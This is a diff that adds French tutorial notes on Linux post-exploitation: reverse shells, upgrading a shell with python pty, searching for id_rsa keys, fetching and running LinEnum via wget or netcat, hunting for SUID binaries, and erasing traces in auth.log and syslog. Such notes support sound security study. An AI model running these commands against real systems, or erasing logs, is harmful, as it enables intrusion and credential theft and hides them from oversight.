@@ -121,3 +121,64 @@ Transferts de fichiers via SMB/NFS
 		de mot de passe. Les commandes sont les mêmes que plus haut en FTP (ls, cd, get, put, pwd, more).
 
 	Voici une vidéo + exemple : https://www.youtube.com/watch?v=HscyCbModk4
+
+Privilèges
+	Un utilisateur doit généralement escalader en privilèges pour faire certaines actions, c'est-à-dire prouver qu'il a par exemple
+	les droits :code:`administrateur` pour modifier la machine (ex: le exécuter en tant qu'administrateur sous Windows par exemple
+	ou sudo/yum/... sous linux).
+
+	Généralement, vous cherchez a obtenir un compte avec un maximum de permissions (escalade) ou alors d'autre comptes avec les même
+	permissions que vous mais accès a d'autres données (horizontal).
+
+Piratage
+	Une fois que vous avez accès à la machine via un invite de commande (ex: reverse shell qui appelle une commande netcat
+	qui envoi un shell sur votre machine).
+
+		* vous pouvez utiliser :code:`echo $0` pour obtenir le chemin (donc nom) de votre shell
+		* vous pouvez essayer :code:`python -c 'import pty; pty.spawn("/bin/bash")'` pour passer à bash
+		* ou directement :code:`bash` si ça marche
+		* vous pouvez utiliser :code:`whoami` pour voir qui vous êtes (les utilisateurs les plus important sont ceux ayant les droits root : /etc/sudoers)
+		* chercher des informations
+
+			* clef ssh : :code:`find / -name id_rsa 2> /dev/null`
+			* sauvegardes
+			* fichiers sensibles, mot de passes
+			* des informations sur la machine (noyau, version, ...)
+
+				* noyau, version
+				* processus, ... qui pourraient être vulnérables
+				* scripts de sauvegarde (exploit crontabs)
+				* fichier/dossiers avec des mauvaises configurations (permissions, etc.)
+				* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+				* https://payatu.com/guide-linux-privilege-escalation
+				*
+
+			* Outil : LinEnum (https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
+
+				* récupérer : :code:`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` ou ftp/...
+				* alternative
+
+					* dans /tmp, sur l'attaqué (IP) on lit le fichier : :code:`nc -l -p 1337 > LinEnum.sh`
+					* sur l'attaquant on écrit le fichier a IP : :code:`nc IP 1337 < LinEnum.sh`
+
+				* :code:`chmod +x LinEnum.sh` et :code:`./LinEnum.sh`
+
+
+			* ...
+
+		* effacer ses traces
+
+			* :code:`/var/log/auth.log` : connexion ssh
+			* :code:`/var/log/syslog` : pare-feu
+			* :code:`/var/log/<service>` : apache (serveur web, access.log)... les logs d'un service.
+
+	Vidéo d'explication : https://www.youtube.com/watch?v=_SMxZPne5QU
+
+Piratage : SUID
+	SUID correspond a une permission qui une fois ajoutée fait qu'un fichier est exécuté avec les droits de son créateur
+	donc un fichier .sh de root est exécuté avec les permissions root.
+
+	https://gtfobins.github.io/ : liste de fichiers binaires qui si la machine n'est pas bien configurée, alors peut
+	être utilisés pour élever ses privilèges.
+
+		* :code:`find / -perm -u=s -type f 2>/dev/null`
